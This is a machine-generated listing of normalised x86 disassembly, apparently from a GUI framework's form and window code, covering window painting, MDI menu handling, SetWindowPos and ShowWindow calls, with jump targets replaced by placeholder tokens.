mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_455670
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cde0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_454fbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_454fa0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d5b0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d450
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_450308
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454fa7
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d5b0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44ee20
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_455670
call sub_4423cc
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4550eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cde0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4550c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4550a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d5b0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d450
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4550ae
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d5b0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_4423cc
mov esi eax
sub_4550cb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ReleaseDC
retn
sub_45517c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4551c8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4556a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4556f0
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_455208
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_4553d6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41ccc4
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_440080
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43b710
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43a508
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_45517c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41ccc4
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_4556a4
test eax eax
je r-xdata
push ebp
call sub_45517c
pop ecx
push ebp
call sub_45517c
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_4551c8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_4524e0
jmp r-xdata
sub_4553e8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_4536b0
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_455454
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_453d4c
mov eax ebx
call sub_4426d0
test al al
je r-xdata
mov eax ebx
call sub_419a14
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_4423cc
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_43f1f0
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_4423cc
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4199e8
call sub_44f964
mov edx esi
mov eax ebx
call sub_4199e8
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
sub_4554ec
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_455569
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_455574
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43f96c
sub_4555a0
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_43f96c
xor edx edx
jmp r-xdata
mov eax esi
call sub_45382c
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_4555d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_43b3d0
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_43f96c
sub_45561c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b4dc
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_455670
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_438aac
sub_4556a4
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_459214
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_459200
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_4556f0
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_459214
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_459200
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_455740
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_4137bc
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_455770
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_4423cc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_4591e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_4591e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_455740
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_4591e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4591d0
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_413918
call sub_403224
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4591d0
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4591d0
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4591d0
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_455874
push ebx
mov ebx eax
mov eax ebx
call sub_45586c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_4215f4
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45589c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_43f924
mov dl 0x1
mov eax esi
call sub_455c00
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_455c7c
mov edx eax
mov eax esi
call sub_43bd6c
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_43fac0
mov dl 0x1
mov eax esi
call sub_454c20
sub_45591c
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_4423cc
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_44bf60
mov edi eax
mov eax ebp
call sub_4423cc
push eax
call DrawMenuBar
sub_455998
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_4194c0
xor edx edx
mov eax ebx
call sub_44d8f8
sub_4559bc
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_45591c
mov eax edx
mov edx ebx
call sub_4194c0
sub_4559e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_455baa
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_459214
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_44f4ac
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_459200
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_4194c0
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_459200
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
mov eax ebx
call sub_4426d0
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_4423cc
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45591c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455bb1
lea eax [ ebp - 0x10 ]
call sub_403f5c
retn
mov dl 0x1
mov eax ebx
call sub_456aa8
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_4426d0
test al al
je r-xdata
mov eax ebx
call sub_4426d0
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_4423cc
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_4423cc
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_4423cc
mov edx eax
mov eax esi
call sub_44f4ac
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_4423cc
push eax
call SetMenu
sub_455bcc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_455bb8
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_455c28
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_455c1c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_455c94
push ebx
mov ebx eax
mov eax ebx
call sub_4419e4
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_455c7c
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_455c7c
mov edx eax
mov eax ebx
call sub_43bd6c
mov edx 0xff00000f
mov eax ebx
call sub_43bd6c
pop ebx
retn
sub_455d18
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4423cc
push eax
call ShowWindow
sub_455d58
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_455770
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_455770
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_4591e4
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4591d0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_455770
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4591e4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_4591d0
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458ed4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458eb8
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458ea0
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_4591d0
call sub_458ea0
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458ea0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458eec
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458ed4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458eb8
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458ea0
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458eec
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458ed4
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_4591d0
call sub_458ed4
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458ed4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458eb8
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458ea0
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458eec
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458ea0
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458eec
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458ed4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4591d0
call sub_458eb8
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_4560ac
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_453660
mov edx esi
mov eax edi
call sub_458a50
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_45615b ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43f1f0
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43f1f0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
